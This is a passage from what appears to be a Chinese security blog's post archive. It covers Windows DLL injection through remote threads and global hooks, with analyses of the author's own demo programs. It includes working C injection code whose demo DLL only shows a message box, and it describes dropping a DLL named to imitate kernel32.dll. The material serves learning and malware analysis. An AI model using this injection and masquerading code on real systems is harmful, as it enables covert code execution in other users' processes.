dwProcessId<br>);<br></code></pre></div></td></tr></table></figure><p>dwDesiredAccess：访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或者多个进程访问权限。如果调用了该函数的进程启用了SeDebugPrivilege权限，则无论安全描述符的内容是什么，它都会授予所请求的访问权限。</p><p>bInheritHandle：若此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程不会进程此句柄。</p><p>dwProcessId：要打开的本地进程PID。</p><p>返回值：如果函数成功，则返回值是指定进程的打开句柄；如果失败，则返回值为NULL。</p><h5 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h5><p>在指定进程的虚拟地址空间内保留、提交或更改内存的状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">LPVOID VirtualAllocEx(<br>  HANDLE hProcess,<br>  LPVOID lpAddress,<br>  SIZE_T dwSize,<br>  DWORD  flAllocationType,<br>  DWORD  flProtect<br>);<br></code></pre></div></td></tr></table></figure><p>hProcess：进程的句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION访问权限。</p><p>lpAddress：指定要分配页面所需起始地址的指针。如果为NULL，则该函数自动分配内存。</p><p>dwSize：要分配的内存大小，以字节为单位。</p><p>flAllocationType：内存分配类型。此参数必须为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>MEM_COMMIT<BR>0x00001000</BR></td><td>在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存</td></tr><tr><td>MEM_RESERVE<BR>0x00002000</BR></td><td>保留进程中虚拟地址空间的范围，但不会在内存或磁盘上的分页文件中分配任何实际物理存储位置</td></tr><tr><td>MEM_RESET<BR>0x00080000</BR></td><td>表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入。</td></tr><tr><td>MEM_RESET_UNDO<BR>0x1000000</BR></td><td>只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO</td></tr></tbody></table><p>flProtect：要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下任何值：</p><ul><li>PAGE_NOACCESS</li><li>PAGE_GUARD</li><li>PAGE_NOCACHE</li><li>PAGE_WRITECOMBINE</li></ul><p>返回值：如果函数成功，则返回值是分配页面的基址；如果失败，则返回为NULL。</p><h5 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h5><p>在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">WriteProcessMemory</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE  hProcess,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPVOID  lpBaseAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCVOID lpBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function">  SIZE_T  nSize,</span></span><br><span class="hljs-params"><span class="hljs-function">  SIZE_T  *lpNumberOfBytesWritten</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hProcess：要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。</p><p>lpBaseAddress：指向指定进程中写入数据的基地址指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败。</p><p>lpBuffer：指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。</p><p>nSize：要写入指定进程的字节数。</p><p>lpNumberOfBytesWritten：指向变量的指针，该变量接受传输到指定进程的字节数。如果为NULL，则忽略该参数。</p><p>返回值：如果函数成功，则返回值不为0；如果失败，则为0；</p><h5 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h5><p>创建一个在另一个进程的虚拟地址空间中运行的线程。</p><figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso"><span class="hljs-keyword">HANDLE</span> CreateRemoteThread(<br>  <span class="hljs-keyword">HANDLE</span>                 hProcess,<br>  LPSECURITY_ATTRIBUTES  lpThreadAttributes,<br>  SIZE_T                 dwStackSize,<br>  LPTHREAD_START_ROUTINE lpStartAddress,<br>  LPVOID                 lpParameter,<br>  DWORD                  dwCreationFlags,<br>  LPDWORD                lpThreadId<br>);<br></code></pre></div></td></tr></table></figure><p>hProcess：要创建线程的进程的句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果为NULL，则线程将会获得默认的安全描述符，并且不能继承该句柄。</p><p>dwStackSize：堆栈的初始大小，以字节为单位。如果参数为0，则新线程使用可执行文件的默认大小。</p><p>lpStartAddress：指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。</p><p>lpParameter：指向要传递给线程函数的变量的指针。</p><p>dwCreationFlags：控制线程创建的标志。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>线程在创建后立即运行</td></tr><tr><td>CREATE_SUSPENDED<BR></BR></td><td>该线程在挂起状态下创建，并且在调用ResumeThread函数之前不会运行</td></tr><tr><td>STACK_SIZE_PARAM_IS_A_RESERVATION<BR></BR></td><td>所述dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志，则dwStackSize指定提交大小。</td></tr></tbody></table><p>lpThreadId：指向接受线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符。</p><p>返回值：如果成功，则返回值是新线程的句柄；如果失败，则返回NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>RemoteThreadInject.cpp代码如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;processthreadsapi.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">CreateRemoteThreadInject</span><span class="hljs-params">(DWORD dwProcessId, WCHAR* pszDllFileName)</span> </span>&#123;<br>HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br>DWORD dwSize = <span class="hljs-number">0</span>;<br>LPVOID pDllAddr = <span class="hljs-literal">NULL</span>;<br>FARPROC pFuncProcAddr = <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">//获取注入进程句柄</span><br>hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);<br><span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>dwSize = lstrlen(pszDllFileName) + <span class="hljs-number">1</span>;<br><span class="hljs-comment">//申请内存</span><br>pDllAddr = VirtualAllocEx(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (pDllAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//向申请的内存写入数据</span><br>BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * <span class="hljs-number">2</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (WriteFlag == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入内存失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//获取loadlibrary</span><br>pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryW&quot;</span>);<br><span class="hljs-keyword">if</span> (pFuncProcAddr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取loadlibrary地址失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (hRemoteThread == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建线程失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>WaitForSingleObject(hRemoteThread, <span class="hljs-number">-1</span>);<br>DWORD code;<br>GetExitCodeThread(hRemoteThread, &amp;code);<br>code = GetLastError();<br>VirtualFreeEx(hProcess, pDllAddr, <span class="hljs-number">0</span>, MEM_RELEASE);<br>CloseHandle(hProcess);<br>CloseHandle(hRemoteThread);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;按下回车开始注入\n&quot;</span>);<br>getchar();<br>HWND hNotepadWindow = FindWindow(<span class="hljs-string">L&quot;Notepad&quot;</span>,<span class="hljs-string">L&quot;无标题 - 记事本&quot;</span>);<br><span class="hljs-keyword">if</span> (hNotepadWindow == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>DWORD dwPID = <span class="hljs-number">0</span>;<br>GetWindowThreadProcessId(hNotepadWindow, &amp;dwPID);<br><span class="hljs-keyword">if</span> (dwPID == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取PID失败\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-keyword">bool</span> flag = CreateRemoteThreadInject(dwPID, <span class="hljs-string">L&quot;自己的文件路径&quot;</span>);<br><span class="hljs-keyword">if</span> (flag == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入失败\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功\n&quot;</span>);<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>dllmain.cpp代码如下，主要实现一个弹窗功能。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;注入成功！&quot;</span>, <span class="hljs-string">L&quot;ok&quot;</span>, MB_OK);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>先打开notepad再打开我们编写的程序，将DLL文件放在指定路径下。</p><p><img src="/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/1.png"></p><p>开始注入，就可以看到已经成功弹出了窗口。</p><p><img src="/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/2.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>病毒分析-资源释放+钩子注入</title>
    <link href="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。</p><p>使用dir工具先查看一下基本信息，可以看到当前程序未加壳。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/1.png"></p><p>再查看一下导入表的相关信息，看看都使用了哪些API。可以看到一些资源相关API，还有Loadlibrary和getprocaddress，这两个API，写过shellcode都知道使用这两个API可以获取所有dll和其中的函数。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/2.png"></p><p>再查看一下字符串的一些信息，可以看到有这样一个字符串“C:\Windows\SysWOW64\kerne132.dll”，可以看到这个dll和系统dll”kernel32.dll”区别是最后一位，用1代替了l。可能是一个恶意的dll被释放到了C:\Windows\SysWOW64\下。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/3.png"></p><p>使用IDA查看一下，F5查看伪代码，可以先看到资源释放的过程，其释放了一个名为“kerne132.dll”的文件到C:\Windows\SysWOW64\下。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/4.png"></p><p>然后调用了这个DLL里面的函数setglobalhook，从名字可以看出来，这应该是一个钩子的函数。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/5.png"></p><p>到目标目录下去查看一下，可以看到这个伪装成kernel32.dll的恶意dll文件。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/7.png"></p><p>使用IDA查看一下这个DLL文件，看一下它的导出表，可以看到导出了两个函数SetGlobalHook和UnsetGlobalHook，从名字上猜测应该是安装钩子和卸载钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/8.png"></p><p>查看SetGlobalHook，可以看到使用了SetWindowsHookExW函数，IDHOOK的值是3,3是WH_GETMESSAGE代表这是一个全局钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/9.png"></p><p>使用PC hunter工具可以很方便的查看是否存在钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/6.png"></p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>病毒分析-资源释放</title>
    <link href="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/"/>
    <url>/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/</url>
    
    <content type="html"><![CDATA[<p>本篇来分析一下自己写的资源释放的小demo。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png"></p><p>打开程序，发现没有任何改变，没有明显的行为。</p><p>使用die工具查一下文件的基本信息</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/2.png"></p><p>查看一下导入表，可以看到FindResource等函数，这几个函数是用来操作资源的，猜测有可能是释放了一个资源节中的资源到电脑上。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/3.png"></p><p>还可以看到fwrite，fopen这样的函数，那么应该就是把资源释放到了一个路径中去。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/4.png"></p><p>可以使用resource hacker来查看程序中的资源，如图可以看到资源信息“this is a test”</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/5.png"></p><p>再使用IDA进行查看，可以很清楚的看到所有的流程，并且看到程序将释放的文件存放在了C:\Windows\System32下。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/6.png"></p><p>因为程序是32位程序，系统是64位，所以资源会被释放到SysWOW64文件下。因为此文件夹是用来处理运行在64位系统上的32位程序的。</p><p>到路径下查找free.txt即可找到</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/7.png"></p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>注入技术-全局钩子注入</title>
    <link href="/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/"/>
    <url>/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h4 id="全局钩子注入"><a href="#全局钩子注入" class="headerlink" title="全局钩子注入"></a>全局钩子注入</h4><p>windows中大部分应用程序都是基于消息机制的，每个进程都有自己的消息队列。</p><p>局部钩子是针对某个线程的，全局钩子是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL文件中实现相应的钩子函数。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="SetWindowsHookEx函数"><a href="#SetWindowsHookEx函数" class="headerlink" title="SetWindowsHookEx函数"></a>SetWindowsHookEx函数</h5><p>将程序定义的钩子函数安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联。</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apl">HHOOK SetWindowsHookExA(<br>  int       idHook,<br>  HOOKPROC  lpfn,<br>  HINSTANCE hmod,<br>  DWORD     dwThreadId<br>);<br></code></pre></div></td></tr></table></figure><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><p>idHook：要安装的钩子程序的类型，该参数具体可以见下表。</p><table><thead><tr><th align="left">值</th><th>含义</th></tr></thead><tbody><tr><td align="left">WH_CALLWNDPROC<br>4</td><td>安装钩子程序，在系统将消息发送到目标窗口过程之前监视消息</td></tr><tr><td align="left">WH_CALLWNDPROCRET<br>12</td><td>安装钩子程序，在目标窗口过程处理消息后监视消息</td></tr><tr><td align="left">WH_CBT<br>5</td><td>安装接受对CBT应用程序有用通知的钩子程序</td></tr><tr><td align="left">WH_DEBUG<br>9</td><td>安装可用于调试其他钩子程序的钩子程序</td></tr><tr><td align="left">WH_FOREGROUNDIDLE<br>11</td><td>安装在应用程序的前台线程即将变为空闲时调用的钩子过程，该钩子对于在空闲时执行低优先级任务很有用</td></tr><tr><td align="left">WH_GETMESSAGE<br>3</td><td>安装一个挂钩过程，它监视发送到消息队列的消息</td></tr><tr><td align="left">WH_JOURNALPLAYBACK<br>1</td><td>安装一个挂钩过程，用于发布先前由WH_JOURNALRECORD挂钩过程记录的消息</td></tr><tr><td align="left">WH_JOURNALRECORD<br>0</td><td>安装一个挂钩过程，记录发布到系统消息队列中的输入消息。这个钩子对于录制宏很有用。</td></tr><tr><td align="left">WH_KEYBOARD<br>2</td><td>安装监视按键消息的挂钩过程</td></tr><tr><td align="left">WH_KEYBOARD_LL<br>13</td><td>安装监视低级键盘输入事件的挂钩过程</td></tr><tr><td align="left">WH_MOUSE<br>7</td><td>安装监视鼠标消息的挂钩过程</td></tr><tr><td align="left">WH_MOUSE_LL<br>14</td><td>安装监视低级鼠标输入事件的挂钩过程</td></tr><tr><td align="left">WH_MSGFILTER<br>-1</td><td>安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息</td></tr><tr><td align="left">WH_SHELL<br>10</td><td>安装接受对于shell应用程序有用通知的钩子程序</td></tr><tr><td align="left">WH_SYSMSGFILTER<br>6</td><td>安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息，钩子程序监视与调用线程相同桌面中所有应用程序的这些消息</td></tr></tbody></table><p>lpfn：一个指向钩子程序的指针。如果dwThreadId参数为0或指定由不同进程创建线程标识符，则lpfn参数必须指向DLL中的钩子过程。否则，lpfn可以指向与当前进程关联的代码中的钩子过程。</p><p>hMod：包含由lpfn参数指向的钩子过程的DLL句柄。如果dwThreadId参数指定由当前进程创建线程，并且钩子过程位于与当前进程关联的代码中，则hMod参数必须设置为NULL。</p><p>dwThreadId：与钩子程序关联的线程标识符。如果此参数为0，则钩子过程与系统中所有线程相关联。</p><h5 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h5><p>如果函数成功，则返回值是钩子过程的句柄。</p><p>如果函数失败，则返回值为NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>创建全局钩子，钩子函数需要在一个DLL文件中。进程的地址空间是独立的，发生对应事件的进程不能调用其他进程地址空间的钩子函数。如果钩子的实现在DLL中的话，则在对应事件发生的时候，系统会把这个DLL加载到发生事件的进程地址空间之中，使它能够调用钩子函数进行处理。创建一个全局钩子之后，在对应事件发生的时候，系统就会把DLL加载到发生事件的进程中，这样就实现了DLL注入。</p><p>设置idHook的值为WH_GETMESSAGE就可以让DLL注入到所有的进程中，因为WH_GETMESSAGE类型的钩子会监视消息队列，并且Windows系统是基于消息驱动的，所有进程都会有一个自己的消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。</p><p>DLL文件如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 